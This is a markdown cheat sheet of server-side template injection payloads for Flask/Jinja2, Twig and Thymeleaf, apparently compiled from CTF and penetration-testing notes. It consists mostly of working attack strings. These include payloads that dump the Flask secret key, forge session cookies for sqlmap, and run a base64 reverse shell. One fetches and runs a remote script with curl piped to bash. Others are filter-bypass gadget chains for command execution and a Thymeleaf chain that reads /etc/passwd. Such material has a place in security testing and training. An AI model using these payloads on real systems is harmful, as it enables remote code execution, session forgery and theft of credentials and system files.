# Server-Side Template Injection (SSTI)

Template injection attacks and exploitation techniques.

---

## Flask-Jinja2

Get the secret key
```txt
{{ config }}
```
Decrypt the cookie
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
SQLi in flask session with sqlmap
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
Bypass filtered ->  `'` `_` `.` `{{}}` `if` `for` 
```python
{% with abuqasem=request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"](%2522os%2522)["popen"](%2522echo%2520%253CBase64EncodedReverseShellCommand%253E%2520%257C%2520base64%2520-d%2520%257C%2520bash%2520-i%2522)["read"]() %}abuqasem{% endwith %}
```
To exploit SSTI by image upload
```python
{% with abuqasem=request["application"]["__globals__"]["__builtins__"]["__import__"](%2522os%2522)["popen"](%2522curl%2520IP/shell.sh%2520%257C%2520bash%2522)["read"]() %}
{{ abuqasem }}
{% endwith %}
```
Bypass filtered -> `()`
```python
## This was injected in an email field
"{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@deafcon.com
```
> Link: https://unicode-search.net/unicode-namesearch.pl?term=PARENTHESIS

Subprocess.Popen
```python
{{ [].__class__.__mro__[-1].__subclasses__()[233](%255B%2522/usr/local/bin/score%2522%252C%25229b9400f8-e969-47ca-9965-c7516f73d0e7%2522%255D).communicate() }}

{{ [].__class__.__mro__[-1].__subclasses__()[233](%2522whoami%2522%252Cshell%253DTrue%252Cstdout%253D-1).communicate() }}
```
> **Note**: Try playing with stdout descriptor to get ouptut.

Twig 1.9
```python
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
```
### Further reading
- [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)  
-  [https://chowdera.com/2020/12/20201221231521371q.html](https://chowdera.com/2020/12/20201221231521371q.html)  
-  [https://jinja.palletsprojects.com/en/2.10.x/templates](https://jinja.palletsprojects.com/en/2.10.x/templates)/
 - [https://book.hacktricks.xyz/pentesting/pentesting-web/flask](https://book.hacktricks.xyz/pentesting/pentesting-web/flask)
## SpringBoot
## Thymleaf-engine
```java
Variable expression ： ${...}\
Select variable expression ： *{...}
Message expression ： #{....}
link URL expression ： @{...}
Fragment Expression ： ~{...}
```
- Read `/etc/passwd`
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
## References
- https://javamana.com/2021/11/20211121071046977B.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd